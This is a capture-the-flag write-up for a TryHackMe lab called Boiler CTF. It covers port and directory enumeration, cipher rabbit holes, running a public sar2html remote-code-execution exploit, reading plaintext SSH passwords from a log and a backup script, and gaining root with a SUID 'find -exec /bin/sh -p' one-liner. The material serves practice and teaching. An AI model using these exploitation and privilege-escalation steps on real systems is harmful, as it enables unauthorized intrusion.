---
title: Boiler CTF   
published: true
tags: [CTF, FTP, SSH, Webmin]
---

<https://tryhackme.com/room/boilerctf2> Intermediate level CTF

* * * 

# Notes

```
nmap scan

PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 61
80/tcp    open  http             syn-ack ttl 61
10000/tcp open  snet-sensor-mgmt syn-ack ttl 61
55007/tcp open  unknown          syn-ack ttl 61


=============================

gobuster scan

robots.txt

User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

the ASCII goes to base which goes to a MD5? 99b0660cd95adea327c54182baa51584

which is the answer to the rabbit hole question...99b0660cd95adea327c54182baa51584:kidding   

the nmap scan top port result seems to be openSSH 55007/tcp open  unknown          syn-ack ttl 61

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/Neighbour]
└─$ telnet 10.10.100.87 55007                    
Trying 10.10.100.87...
Connected to 10.10.100.87.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```



# File extension after anon login

We can login to FTP anonymously, and get a note.

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/Neighbour]
└─$ cat .info.txt          
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

ROT13 Cipher

# What is on the highest port?

ssh we found earliar

# What's running on port 10000?

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/Neighbour]
└─$ nmap -sC -sV -Pn 10.10.189.181 -p10000
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 15:30 PST
Nmap scan report for 10.10.189.181
Host is up (0.18s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-server-header: MiniServ/1.930
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

# Can you exploit the service running on that port? (yay/nay answer)

exploitdb doesn't seem to contain anything.

# What's CMS can you access? Keep enumerating, you'll know when you find it.

joomla

# The interesting file name in the folder?

during gobuster scan i found a folder `http://boiler-ctf.thm/joomla/_files/` inside is another cipher `VjJodmNITnBaU0JrWVdsemVRbz0K`. Which is twice base64 decoded to `whoopsie daisy`. another rabbit hole.

we do find a folder after adjusting the wordlist http://boiler-ctf.thm/joomla/_test which has a RCE in exploitdb.

executing the script

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/Boiler-CTF]
└─$ python3 49344.py   
Enter The url => http://boiler-ctf.thm/joomla/_test/           
Command => ls
HPUX
Linux
SunOS
index.php
log.txt
sar2html
sarFILE

Command => cat log.txt
HPUX
Linux
SunOS
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```

# Where was the other users pass stored(no extension, just the name)?

after logging into the ssh on the top port checking the backup.sh

```
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "## ## ## ## ## ## ## ## ## ## " >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```

# user.txt



# What did you exploit to get the privileged user?

`find / -perm -u=s 2>/dev/null`

find has SUID set which means it doesnt drop elevated priviliges. We can use it to execure commands and spawn a root shell. `find . -exec /bin/sh -p \; -quit`

# root.txt

cat root.txt


also the user.txt is not user.txt its .secret...